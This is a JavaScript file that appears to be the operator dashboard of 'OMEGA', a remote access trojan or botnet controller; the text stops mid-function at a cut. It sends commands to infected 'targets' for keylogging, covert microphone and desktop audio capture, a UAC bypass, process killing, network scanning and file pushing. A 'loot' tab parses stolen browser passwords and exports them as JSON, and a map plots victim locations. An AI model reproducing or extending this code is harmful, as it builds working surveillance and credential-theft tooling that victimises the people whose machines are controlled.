// â”€â”€ KEYBOARD SHORTCUT HANDLER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
document.addEventListener("keydown", (e) => {
	// Ctrl+K = batch command
	if ((e.ctrlKey || e.metaKey) && e.key === "k" && !currentTargetId) {
		e.preventDefault();
		_promptBatchCmd();
	}
	// Ctrl+/ = toggle event log
	if ((e.ctrlKey || e.metaKey) && e.key === "/") {
		e.preventDefault();
		_showView("logs");
	}
	// Escape = close remote if open
	if (e.key === "Escape" && currentTargetId && document.activeElement?.tagName !== "INPUT") {
		closeRemote();
	}
});

// â”€â”€ ENHANCED SHELL OUTPUT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Override the shell output handler to always show in the right place
function _appendShellOutput(txt) {
	const shellEl = $("shellOutput");
	if (shellEl) {
		const ts = new Date().toLocaleTimeString();
		shellEl.textContent += `\n[${ts}] ${txt}`;
		if (!_shellScrollLocked) shellEl.scrollTop = shellEl.scrollHeight;
	}
	showToolResult("Shell Output", txt);
}

// â”€â”€ LOGS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function logEvent(msg, type = "info") {
	const el = $("eventLogStream");
	if (!el) return;
	const t = new Date().toLocaleTimeString();
	const cls =
		type === "ok"
			? "log-ok"
			: type === "warn"
				? "log-warn"
				: type === "err"
					? "log-err"
					: "log-info";
	el.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
	el.scrollTop = el.scrollTopMax || el.scrollHeight;
}
// â”€â”€ DUAL AUDIO ENGINE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const _audioCtxs = {}; // keyed: 'mic' | 'desktop'
const _audioNext = {}; // scheduled time per context

function _getAudioCtx(key) {
	if (!_audioCtxs[key]) {
		const rate = 44100; // MRL fix: standardized to 44100Hz for both mic and desktop
		_audioCtxs[key] = new (window.AudioContext || window.webkitAudioContext)({
			sampleRate: rate,
			latencyHint: "interactive",
		});
		_audioNext[key] = 0;
	}
	const ctx = _audioCtxs[key];
	if (ctx.state === "suspended") ctx.resume();
	return ctx;
}

const _audioFilters = {};

function _getAudioChain(ctx, key) {
	if (!_audioCompressors[key]) {
		// High-pass filter to remove DC offset (crackle/pops)
		const hpFilter = ctx.createBiquadFilter();
		hpFilter.type = "highpass";
		hpFilter.frequency.value = 40; // 40Hz cut-off

		// Dynamics compressor prevents clipping & loud pops
		const comp = ctx.createDynamicsCompressor();
		comp.threshold.value = -24;  // Start compressing at -24dB
		comp.knee.value      = 10;   // Soft knee for natural sound
		comp.ratio.value     = 8;    // 8:1 compression ratio
		comp.attack.value    = 0.003;
		comp.release.value   = 0.2;

		// Gain node for volume control (default -6dB to prevent clipping)
		const gain = ctx.createGain();
		gain.gain.value = 0.5;

		// Connect chain: Source -> HP Filter -> Compressor -> Gain -> Destination
		hpFilter.connect(comp);
		comp.connect(gain);
		gain.connect(ctx.destination);

		_audioFilters[key] = hpFilter;
		_audioCompressors[key] = comp;
		_audioGains[key] = gain;
	}
	// Return the FIRST node in the chain so the source can connect to it
	return _audioFilters[key];
}

function handleAudioChunk(data, key) {
	const ctx = _getAudioCtx(key);
	const chain = _getAudioChain(ctx, key);
	const samples = new Int16Array(data.buffer, data.byteOffset, data.byteLength >> 1);
	const float32 = new Float32Array(samples.length);
	for (let i = 0; i < samples.length; i++) float32[i] = samples[i] / 32768.0;
	const rate = 44100; // MRL fix: standardized to 44100Hz for both mic and desktop
	const buf = ctx.createBuffer(1, float32.length, rate);
	buf.getChannelData(0).set(float32);
	const now = ctx.currentTime;
	if (_audioNext[key] < now) _audioNext[key] = now + 0.05; // reset + small buffer
	const src = ctx.createBufferSource();
	src.buffer = buf;
	src.connect(chain);
	src.start(_audioNext[key]);
	_audioNext[key] += buf.duration;
	// Animate HUD meter bars
	if (key === "mic") {
		let sum = 0;
		for (let i = 0; i < float32.length; i++) sum += float32[i] * float32[i];
		const rms = Math.sqrt(sum / float32.length);
		const h = Math.min(12, Math.round(rms * 120));
		const pat = [0.4, 0.7, 1.0, 0.7, 0.4].map((f) => Math.max(2, Math.round(h * f)));
		for (let b = 0; b < 5; b++) {
			const el = $(`audBar${b}`);
			if (el) el.style.height = `${pat[b]}px`;
		}
	}
}
// Legacy shim
function handleAudio(data, key = "mic") {
	handleAudioChunk(data, key);
}

// â”€â”€ DRAGGABLE CAMERA POPUP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function initDraggableCam() {
	const el = $("camContainer");
	const header = $("camHeader");
	if (!el || !header) return;

	let isDragging = false;
	let startX, startY, startLeft, startTop;

	function clamp(val, min, max) {
		return Math.max(min, Math.min(max, val));
	}
	function startDrag(clientX, clientY) {
		isDragging = true;
		el.classList.add("dragging");

		// Convert current position to absolute if using bottom/right
		const parent = el.offsetParent || document.body;
		const pr = parent.getBoundingClientRect();
		const er = el.getBoundingClientRect();
		// Pin to absolute top/left
		el.style.left = `${er.left - pr.left}px`;
		el.style.top = `${er.top - pr.top}px`;
		el.style.right = "auto";
		el.style.bottom = "auto";

		startX = clientX;
		startY = clientY;
		startLeft = parseInt(el.style.left, 10) || 0;
		startTop = parseInt(el.style.top, 10) || 0;
	}

	function moveDrag(clientX, clientY) {
		if (!isDragging) return;
		const parent = el.offsetParent || document.body;
		const maxLeft = parent.offsetWidth - el.offsetWidth;
		const maxTop = parent.offsetHeight - el.offsetHeight;
		el.style.left = `${clamp(startLeft + (clientX - startX), 0, maxLeft)}px`;
		el.style.top = `${clamp(startTop + (clientY - startY), 0, maxTop)}px`;
	}

	function endDrag() {
		isDragging = false;
		el.classList.remove("dragging");
	}

	// Mouse
	header.addEventListener("mousedown", (e) => {
		if (e.button !== 0) return;
		e.preventDefault();
		startDrag(e.clientX, e.clientY);
	});
	document.addEventListener("mousemove", (e) => moveDrag(e.clientX, e.clientY));
	document.addEventListener("mouseup", endDrag);

	// Touch
	header.addEventListener(
		"touchstart",
		(e) => {
			e.preventDefault();
			startDrag(e.touches[0].clientX, e.touches[0].clientY);
		},
		{ passive: false },
	);
	document.addEventListener(
		"touchmove",
		(e) => {
			if (!isDragging) return;
			e.preventDefault();
			moveDrag(e.touches[0].clientX, e.touches[0].clientY);
		},
		{ passive: false },
	);
	document.addEventListener("touchend", endDrag);
}

function initDraggablePanel() {
	const el = $("remoteSidebar");
	const header = $("remoteSidebarHeader");
	if (!el || !header) return;

	let isDragging = false;
	let startX, startY, startLeft, startTop;

	function clamp(val, min, max) {
		return Math.max(min, Math.min(max, val));
	}

	function startDrag(clientX, clientY) {
		isDragging = true;
		el.classList.add("dragging");

		const parent = el.offsetParent || document.body;
		const pr = parent.getBoundingClientRect();
		const er = el.getBoundingClientRect();

		el.style.left = `${er.left - pr.left}px`;
		el.style.top = `${er.top - pr.top}px`;
		el.style.transform = "none";
		el.style.right = "auto";
		el.style.bottom = "auto";
		el.style.height = `${er.height}px`;

		startX = clientX;
		startY = clientY;
		startLeft = parseInt(el.style.left, 10) || 0;
		startTop = parseInt(el.style.top, 10) || 0;
	}

	function moveDrag(clientX, clientY) {
		if (!isDragging) return;
		const parent = el.offsetParent || document.body;
		const maxLeft = parent.offsetWidth - el.offsetWidth;
		const maxTop = parent.offsetHeight - el.offsetHeight;
		el.style.left = `${clamp(startLeft + (clientX - startX), 0, maxLeft)}px`;
		el.style.top = `${clamp(startTop + (clientY - startY), 0, maxTop)}px`;
	}

	function endDrag() {
		if (!isDragging) return;
		isDragging = false;
		el.classList.remove("dragging");
	}

	header.addEventListener("mousedown", (e) => {
		if (e.target.closest("button")) return;
		if (e.button !== 0) return;
		e.preventDefault();
		startDrag(e.clientX, e.clientY);
	});
	document.addEventListener("mousemove", (e) => moveDrag(e.clientX, e.clientY));
	document.addEventListener("mouseup", endDrag);

	header.addEventListener(
		"touchstart",
		(e) => {
			if (e.target.closest("button")) return;
			e.preventDefault();
			startDrag(e.touches[0].clientX, e.touches[0].clientY);
		},
		{ passive: false },
	);
	document.addEventListener(
		"touchmove",
		(e) => {
			if (!isDragging) return;
			e.preventDefault();
			moveDrag(e.touches[0].clientX, e.touches[0].clientY);
		},
		{ passive: false },
	);
	document.addEventListener("touchend", endDrag);
}

let _audioTabScanned = false;
function setRemoteTab(tab) {
	const tabs = ["info", "audio", "shell", "ps", "files", "kl", "loot", "tools"];
	tabs.forEach((t) => {
		const pane = $(`remoteTab_${t}`),
			btn = $(`tabBtn_${t}`);
		if (pane) pane.style.display = t === tab ? "" : "none";
		if (btn) btn.classList.toggle("active", t === tab);
	});
	if (tab === "ps") listProcesses();
	if (tab === "files") {
		if (!_fsBreadcrumb.length) window._fsNavigate("C:\\");
	}
	if (tab === "audio" && !_audioTabScanned) {
		_audioTabScanned = true;
		loadAudioDevices();
		// Init buttons to RED = off state
		_setAudioBtn("btnMicOn", false);
		_setAudioBtn("btnDeskOn", false);
	}
}

function loadAudioDevices() {
	if (!currentTargetId || !socket) return;
	socket.send(JSON.stringify({ type: "audio_devices", id: currentTargetId }));
	logEvent("Scanning audio devices...", "ok");
}

function handleAudioDevices(msg) {
	// inputs: [{id,name,loopback}]  outputs: [{id,name}]
	const inputs = msg.inputs || [];
	const _outputs = msg.outputs || [];

	const inSel = $("audioInputSelect");
	if (inSel) {
		inSel.innerHTML = '<option value="">Default Microphone</option>';
		inputs
			.filter((d) => !d.loopback)
			.forEach((d) => {
				const o = document.createElement("option");
				o.value = d.id;
				o.textContent = d.name;
				inSel.appendChild(o);
			});
	}
	const outSel = $("audioOutputSelect");
	if (outSel) {
		outSel.innerHTML = '<option value="">Default Speaker Loopback</option>';
		inputs
			.filter((d) => d.loopback)
			.forEach((d) => {
				const o = document.createElement("option");
				o.value = d.id;
				o.textContent = `ðŸ”Š ${d.name}`;
				outSel.appendChild(o);
			});
	}
	logEvent(
		`Audio: ${inputs.filter((d) => !d.loopback).length} mic(s), ${inputs.filter((d) => d.loopback).length} loopback(s)`,
		"ok",
	);
}

function sendRemoteCmd(t, extra = {}) {
	if (!socket || !currentTargetId) return;
	socket.send(JSON.stringify({ type: t, id: currentTargetId, ...extra }));
	if ($("toolsResult"))
		$("toolsResult").textContent = "Waiting for response...";
}

function _promptSearch() {
	const q = prompt("Enter search term (filename):");
	if (q) sendRemoteCmd("file_search", { query: q });
}

// â”€â”€ AUDIT LOGS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _auditCategory = "all";
let _auditRefreshTimer = null;

const AUDIT_CAT_COLORS = {
	auth: { bg: "rgba(79,140,255,.15)", color: "#4f8cff", label: "AUTH" },
	operator: { bg: "rgba(45,212,191,.15)", color: "#2dd4bf", label: "OPERATOR" },
	node: { bg: "rgba(52,211,153,.15)", color: "#34d399", label: "NODE" },
	action: { bg: "rgba(251,191,36,.15)", color: "#fbbf24", label: "ACTION" },
	chat: { bg: "rgba(167,139,250,.15)", color: "#a78bfa", label: "CHAT" },
	admin: { bg: "rgba(248,113,113,.15)", color: "#f87171", label: "ADMIN" },
};
const LEVEL_COLORS = {
	info: "#4f8cff",
	warn: "#fbbf24",
	error: "#f87171",
	critical: "#f87171",
};

window.renderAuditRow = (e, prepend = false) => {
	const tbl = $("auditLogTable");
	if (!tbl) return;
	const tbody = tbl.querySelector("tbody");
	if (!tbody) return;
	const cat = AUDIT_CAT_COLORS[e.category] || {
		bg: "rgba(255,255,255,.05)",
		color: "#aaa",
		label: e.category.toUpperCase(),
	};
	const lvlColor = LEVEL_COLORS[e.level] || "#aaa";
	const ts = new Date(e.ts * 1000);
	const timeStr =
		ts.toLocaleTimeString() +
		" " +
		ts.toLocaleDateString(undefined, { month: "2-digit", day: "2-digit" });
	const tr = document.createElement("tr");
	tr.style.cssText =
		"border-bottom:1px solid rgba(255,255,255,.04);transition:background .2s;";
	tr.onmouseenter = () => (tr.style.background = "rgba(255,255,255,.03)");
	tr.onmouseleave = () => (tr.style.background = "");
	tr.innerHTML = `
        <td style="padding:.35rem .6rem;font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace;white-space:nowrap">${timeStr}</td>
        <td style="padding:.35rem .4rem">
            <span style="font-size:.58rem;font-weight:700;padding:.15rem .4rem;border-radius:4px;background:${cat.bg};color:${cat.color};letter-spacing:.05em">${cat.label}</span>
        </td>
        <td style="padding:.35rem .4rem">
            <span style="width:6px;height:6px;border-radius:50%;display:inline-block;background:${lvlColor};margin-right:4px;vertical-align:middle"></span>
        </td>
        <td style="padding:.35rem .5rem;font-size:.7rem;font-weight:600;color:var(--text-1)">${e.username || "â€”"}</td>
        <td style="padding:.35rem .5rem;font-size:.65rem;color:var(--text-3);font-family:'JetBrains Mono',monospace;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${e.target || ""}">${e.target || "â€”"}</td>
        <td style="padding:.35rem .5rem;font-size:.68rem;color:var(--accent);font-weight:600">${e.action || ""}</td>
        <td style="padding:.35rem .5rem;font-size:.65rem;color:var(--text-2);max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${(e.detail || "").replace(/"/g, "'")}">${e.detail || ""}</td>
        <td style="padding:.35rem .5rem;font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">${e.ip || "â€”"}</td>
    `;
	if (prepend && tbody.firstChild) tbody.insertBefore(tr, tbody.firstChild);
	else tbody.appendChild(tr);
};

window.prependAuditRow = (e) => {
	if (_auditCategory !== "all" && e.category !== _auditCategory) return;
	const tbl = $("auditLogTable");
	if (!tbl?.closest("#view-logs")) return;
	renderAuditRow(e, true);
	const tbody = tbl.querySelector("tbody");
	while (tbody && tbody.children.length > 200)
		tbody.removeChild(tbody.lastChild);
};

window.loadAuditLogs = async (category = "") => {
	_auditCategory = category || _auditCategory;
	const viewEl = $("view-logs");
	if (!viewEl) return;

	if (!$("auditLogPanel")) {
		viewEl.innerHTML = `
<div style="padding:1.5rem">
  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1.25rem;flex-wrap:wrap;gap:.75rem">
    <div>
      <div style="font-size:.6rem;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:var(--text-3)">Forensic Intelligence</div>
      <div style="font-size:1.25rem;font-weight:800;color:var(--text-1);margin-top:.2rem">Audit Log</div>
    </div>
    <div style="display:flex;gap:.5rem;flex-wrap:wrap" id="auditCatBtns">
      ${["all", "auth", "operator", "node", "action", "chat", "admin"]
				.map(
					(c) =>
						`<button type="button" id="auditBtn_${c}" onclick="loadAuditLogs('${c}')" style="font-size:.65rem;padding:.3rem .75rem;border-radius:6px;border:1px solid var(--border);background:var(--bg-card);color:var(--text-2);cursor:pointer;font-family:inherit;font-weight:600;transition:var(--t)">${c.toUpperCase()}</button>`,
				)
				.join("")}
    </div>
  </div>
  <div id="auditLogPanel" style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;overflow:hidden">
    <div style="overflow-x:auto">
      <table id="auditLogTable" style="width:100%;border-collapse:collapse">
        <thead>
          <tr style="background:rgba(255,255,255,.04);font-size:.58rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-3)">
            <th style="padding:.5rem .6rem;text-align:left;white-space:nowrap">Time</th>
            <th style="padding:.5rem .4rem;text-align:left">Category</th>
            <th style="padding:.5rem .4rem;text-align:left">Lvl</th>
            <th style="padding:.5rem .5rem;text-align:left">User</th>
            <th style="padding:.5rem .5rem;text-align:left">Target</th>
            <th style="padding:.5rem .5rem;text-align:left">Action</th>
            <th style="padding:.5rem .5rem;text-align:left">Detail</th>
            <th style="padding:.5rem .5rem;text-align:left">IP</th>
          </tr>
        </thead>
        <tbody id="auditLogBody"></tbody>
      </table>
    </div>
    <div id="auditLoadingMsg" style="text-align:center;padding:2rem;color:var(--text-3);font-size:.84rem">Loading audit logs...</div>
  </div>
  <div style="margin-top:.75rem;display:flex;align-items:center;justify-content:space-between">
    <span id="auditCount" style="font-size:.68rem;color:var(--text-3)"></span>
    <div id="eventLogStream" style="display:none"></div>
  </div>
</div>`;
	}

	["all", "auth", "operator", "node", "action", "chat", "admin"].forEach(
		(c) => {
			const b = $(`auditBtn_${c}`);
			if (b) {
				b.style.background =
					c === _auditCategory ? "var(--accent)" : "var(--bg-card)";
				b.style.color = c === _auditCategory ? "#fff" : "var(--text-2)";
				b.style.borderColor =
					c === _auditCategory ? "var(--accent)" : "var(--border)";
			}
		},
	);

	const msg = $("auditLoadingMsg");
	try {
		const url = `/api/admin/audit-logs?limit=200${_auditCategory !== "all" ? `&category=${_auditCategory}` : ""}`;
		const r = await fetch(url);
		if (!r.ok) {
			if (msg) msg.textContent = "Access denied â€” admin only.";
			return;
		}
		const logs = await r.json();
		if (msg) msg.style.display = "none";
		const tbody = $("auditLogTable")?.querySelector("tbody");
		if (tbody) {
			tbody.innerHTML = "";
			logs.forEach((e) => {
				renderAuditRow(e);
			});
		}
		if ($("auditCount"))
			$("auditCount").textContent = `${logs.length} entries (newest first)`;

		clearTimeout(_auditRefreshTimer);
		_auditRefreshTimer = setTimeout(() => loadAuditLogs(), 15000);
	} catch (e) {
		if (msg) msg.textContent = `Error loading logs: ${e.message}`;
	}
};

function renderLoot(data) {
	const body = $("lootResultBody");
	if (!body) return;
	
	// Parse the raw text data into objects if it's the OMEGA dump format
	const lines = data.split('\n');
	let currentEntry = null;
	const entries = [];
	
	lines.forEach(line => {
		if (line.includes("Browser  :")) {
			if (currentEntry) entries.push(currentEntry);
			currentEntry = { type: "Password", site: "", user: "", secret: "" };
			currentEntry.type = line.split(':')[1].trim();
		} else if (line.includes("Site     :")) {
			if (currentEntry) currentEntry.site = line.split(':')[1].trim();
		} else if (line.includes("User     :")) {
			if (currentEntry) currentEntry.user = line.split(':')[1].trim();
		} else if (line.includes("Pass     :")) {
			if (currentEntry) currentEntry.secret = line.split(':')[1].trim();
		}
	});
	if (currentEntry) entries.push(currentEntry);
	
	if (entries.length === 0) {
		body.innerHTML = `<tr><td colspan="5" style="text-align:center;padding:2rem;color:var(--text-3)">${data}</td></tr>`;
		return;
	}
	
	body.innerHTML = entries.map(e => `
		<tr class="loot-row" style="border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.2s">
			<td style="padding:.6rem;color:var(--amber);font-weight:700;font-size:.55rem">${e.type.toUpperCase()}</td>
			<td style="padding:.6rem;color:var(--text-1);max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${e.site}">${e.site}</td>
			<td style="padding:.6rem;color:var(--text-2)">${e.user}</td>
			<td style="padding:.6rem;font-family:'JetBrains Mono',monospace;color:var(--teal)" data-secret="${e.secret}">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</td>
			<td style="padding:.6rem;text-align:center">
				<button type="button" class="btn-ghost" style="font-size:.6rem;padding:.2rem .4rem" onclick="copyToClipboard('${e.secret}')">ðŸ“‹ Copy</button>
			</td>
		</tr>
	`).join('');
}

function filterLoot(query) {
	const q = query.toLowerCase();
	document.querySelectorAll(".loot-row").forEach(row => {
		row.style.display = row.textContent.toLowerCase().includes(q) ? "" : "none";
	});
}

function copyToClipboard(text) {
	navigator.clipboard.writeText(text).then(() => {
		showToast("Copied to clipboard", "ok");
	});
}

function handleDrop(e) {
	const files = e.dataTransfer.files;
	if (!files.length || !currentTargetId || !socket) return;
	
	for (const f of files) {
		uploadFileInChunks(f);
	}
}

async function uploadFileInChunks(file) {
	const CHUNK_SIZE = 64 * 1024; // 64KB
	const total = file.size;
	let offset = 0;
	
	logEvent(`ðŸ“¤ Starting upload: ${file.name} (${(total/1024).toFixed(1)} KB)`, "info");
	
	const reader = new FileReader();
	
	const sendNext = () => {
		const slice = file.slice(offset, offset + CHUNK_SIZE);
		reader.onload = (event) => {
			const data = event.target.result;
			const base64 = btoa(
				new Uint8Array(data)
					.reduce((acc, byte) => acc + String.fromCharCode(byte), "")
			);
			
			socket.send(JSON.stringify({
				type: "file_upload",
				id: currentTargetId,
				name: file.name,
				data: base64,
				offset: offset,
				total: total,
				is_last: (offset + CHUNK_SIZE >= total)
			}));
			
			offset += CHUNK_SIZE;
			if (offset < total) {
				sendNext();
			} else {
				logEvent(`âœ… Upload complete: ${file.name}`, "ok");
				showToast(`Uploaded ${file.name}`, "ok");
			}
		};
		reader.readAsArrayBuffer(slice);
	};
	
	sendNext();
}

function exportLoot() {
	const rows = document.querySelectorAll(".loot-row");
	const data = [];
	rows.forEach(row => {
		const cells = row.querySelectorAll("td");
		if (cells.length >= 4) {
			data.push({
				type: cells[0].textContent,
				site: cells[1].textContent,
				user: cells[2].textContent,
				secret: cells[3].getAttribute("data-secret") || cells[3].textContent
			});
		}
	});
	
	const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
	const url = URL.createObjectURL(blob);
	const a = document.createElement("a");
	a.href = url;
	a.download = `omega_loot_${new Date().getTime()}.json`;
	a.click();
	URL.revokeObjectURL(url);
	logEvent(`ðŸ“¥ Exported ${data.length} credentials to JSON`, "ok");
}

function showToolResult(label, content, isHtml = false) {
	const wrap = $("toolsResultWrap");
	const lbl = $("toolsResultLabel");
	const out = $("toolsResult");
	if (!wrap || !out) return;
	
	// If this looks like a loot dump, also update the loot tab
	if (content.includes("=== OMEGA CREDENTIAL DUMP")) {
		renderLoot(content);
		setRemoteTab('loot');
	}

	wrap.style.display = "block";
	lbl.textContent = label;
	if (isHtml) out.innerHTML = content;
	else out.textContent = content;
	out.scrollTop = 0;
}

function clearToolResult() {
	const wrap = $("toolsResultWrap");
	const out = $("toolsResult");
	if (wrap) wrap.style.display = "none";
	if (out) out.innerHTML = "";
}

// â”€â”€ ADVANCED TOOLS â”€â”€
function listProcesses() {
	if (!currentTargetId || !socket) return;
	socket.send(JSON.stringify({ type: "ps_list", id: currentTargetId }));
	if ($("psResult")) $("psResult").textContent = "Loading...";
}
function filterProcesses(query) {
	const q = query.toLowerCase();
	const rows = document.querySelectorAll("#psResult table tr");
	rows.forEach((row, i) => {
		if (i === 0) return; // Skip header
		row.style.display = row.textContent.toLowerCase().includes(q) ? "" : "none";
	});
}
function killProcess(pid) {
	if (!currentTargetId || !socket) return;
	socket.send(JSON.stringify({ type: "ps_kill", pid, id: currentTargetId }));
	setTimeout(listProcesses, 600);
}
function _runNetScan() {
	if (!currentTargetId || !socket) return;
	socket.send(JSON.stringify({ type: "net_scan", id: currentTargetId }));
	if ($("toolsResult")) $("toolsResult").textContent = "Scanning network...";
}
function _runFileSearch() {
	const q = prompt("Search filename:");
	if (!q) return;
	socket.send(
		JSON.stringify({ type: "file_search", query: q, id: currentTargetId }),
	);
	if ($("toolsResult")) $("toolsResult").textContent = "Searching...";
}
function _runUacBypass() {
	if (!currentTargetId || !socket) return;
	socket.send(JSON.stringify({ type: "uac_bypass", id: currentTargetId }));
}
// â”€â”€ KEYLOGGER â”€â”€
let klRunning = false;
function _toggleKeylogger() {
	if (!currentTargetId || !socket) return;
	klRunning = !klRunning;
	const btn = $("btnKlStart");
	if (klRunning) {
		socket.send(JSON.stringify({ type: "keylog_start", id: currentTargetId }));
		if (btn) {
			btn.textContent = "â¹ Stop";
			btn.style.background = "rgba(248,113,113,.2)";
		}
		if ($("klOutput")) $("klOutput").textContent = "";
	} else {
		socket.send(JSON.stringify({ type: "keylog_stop", id: currentTargetId }));
		if (btn) {
			btn.textContent = "â–¶ Start";
			btn.style.background = "";
		}
	}
}

// â”€â”€ AUDIO SURVEILLANCE (Mic / Desktop) â€” dual independent streams â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _micOn = false;
let _deskOn = false;

function _setAudioBtn(btnId, isOn) {
	const btn = $(btnId);
	if (!btn) return;
	btn.classList.toggle("active", isOn);
}

function _toggleAudio(source, forceState) {
	if (!socket || !currentTargetId) return;
	const isMic = source === "mic";
	const cur = isMic ? _micOn : _deskOn;
	// forceState=false â†’ stop. forceState=true â†’ start. undefined â†’ toggle
	const turnOn =
		forceState === true ? true : forceState === false ? false : !cur;

	if (turnOn) {
		const device_id = isMic
			? $("audioInputSelect")?.value || null
			: $("audioOutputSelect")?.value || null;
		const action = isMic ? "mic" : "audio";
		socket.send(
			JSON.stringify({
				type: "rtc_toggle",
				action,
				value: true,
				source,
				device_id,
				id: currentTargetId,
			}),
		);
		if (isMic) {
			_micOn = true;
			_setAudioBtn("btnAudioMic", true);
		} else {
			_deskOn = true;
			_setAudioBtn("btnAudioDesk", true);
		}
		// Show HUD chip
		const chip = $("audioChip");
		if (chip) {
			chip.style.display = "flex";
		}
		const lbl = $("audioSourceLabel");
		if (lbl)
			lbl.textContent = _micOn && _deskOn ? "MIC+DESK" : isMic ? "MIC" : "DESK";
		logEvent(`ðŸŽ™ï¸ ${isMic ? "Mic" : "Desktop"} audio ON`, "ok");
	} else {
		socket.send(
			JSON.stringify({
				type: "rtc_toggle",
				action: isMic ? "mic" : "audio",
				value: false,
				source,
				id: currentTargetId,
			}),
		);
		if (isMic) {
			_micOn = false;
			_setAudioBtn("btnAudioMic", false);
		} else {
			_deskOn = false;
			_setAudioBtn("btnAudioDesk", false);
		}
		// Close the matching AudioContext to free resources
		if (_audioCtxs[source]) {
			_audioCtxs[source].close();
			delete _audioCtxs[source];
			delete _audioNext[source];
		}
		// Hide HUD chip only when both off
		if (!_micOn && !_deskOn) {
			const chip = $("audioChip");
			if (chip) chip.style.display = "none";
		}
		const lbl = $("audioSourceLabel");
		if (lbl) lbl.textContent = _micOn ? "MIC" : _deskOn ? "DESK" : "";
		logEvent(`${isMic ? "Mic" : "Desktop"} audio OFF`, "warn");
	}
}

// â”€â”€ SESSION RECORDING â”€â”€
let _mediaRecorder = null,
	_recChunks = [];
function _toggleRecording() {
	const btn = $("btnRecord");
	if (_mediaRecorder && _mediaRecorder.state !== "inactive") {
		_mediaRecorder.stop();
		if (btn) btn.style.color = "";
		logEvent("Recording stopped. Saving file...", "ok");
		return;
	}
	const img = $("desktopView");
	if (!img?.naturalWidth) {
		logEvent("No stream to record.", "warn");
		return;
	}
	const canvas = document.createElement("canvas");
	canvas.width = img.naturalWidth;
	canvas.height = img.naturalHeight;
	const ctx2 = canvas.getContext("2d");
	const rafId = setInterval(() => {
		if (img.src) ctx2.drawImage(img, 0, 0);
	}, 33);
	_recChunks = [];
	try {
		_mediaRecorder = new MediaRecorder(canvas.captureStream(30), {
			mimeType: "video/webm;codecs=vp9",
		});
	} catch (_) {
		_mediaRecorder = new MediaRecorder(canvas.captureStream(30));
	}
	_mediaRecorder.ondataavailable = (e) => {
		if (e.data.size > 0) _recChunks.push(e.data);
	};
	_mediaRecorder.onstop = () => {
		clearInterval(rafId);
		const blob = new Blob(_recChunks, { type: "video/webm" });
		const a = document.createElement("a");
		a.href = URL.createObjectURL(blob);
		a.download = `omega_session_${Date.now()}.webm`;
		a.click();
	};
	_mediaRecorder.start(1000);
	if (btn) btn.style.color = "var(--red)";
	logEvent("Session recording started.", "ok");
}

// â”€â”€ GEOIP MAP â”€â”€
let leafletMap = null;
let mapMarkers = {};
function renderMapPins() {
	const W = $("map");
	if (!W) return;

	if (!leafletMap && window.L) {
		leafletMap = L.map("map").setView([20, 0], 2);
		L.tileLayer(
			"https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",
			{
				attribution: "&copy; OpenStreetMap contributors &copy; CARTO",
				subdomains: "abcd",
				maxZoom: 20,
			},
		).addTo(leafletMap);
	}
	if (!leafletMap) return;

	// Clear old markers
	for (const id in mapMarkers) {
		leafletMap.removeLayer(mapMarkers[id]);
	}
	mapMarkers = {};

	currentNodes
		.filter((n) => n.status === "Online")
		.forEach((n) => {
			const s = n.specs || n;
			const lon = parseFloat(s.lon || s.longitude || 0);
			const lat = parseFloat(s.lat || s.latitude || 0);
			if (!lon && !lat) return;

			const displayId = s.hostname || n.id;

			// Use a pulsing DivIcon for better visibility and premium feel
			const pulseIcon = L.divIcon({
				className: "custom-div-icon",
				html: `<div class="map-marker-pulse" title="${displayId}"></div>`,
				iconSize: [12, 12],
				iconAnchor: [6, 6],
			});

			const marker = L.marker([lat, lon], { icon: pulseIcon }).addTo(
				leafletMap,
			);
			marker.bindPopup(`
            <div style="color:#000;font-family:'Outfit',sans-serif">
                <div style="font-weight:900;font-size:12px;margin-bottom:2px">${displayId}</div>
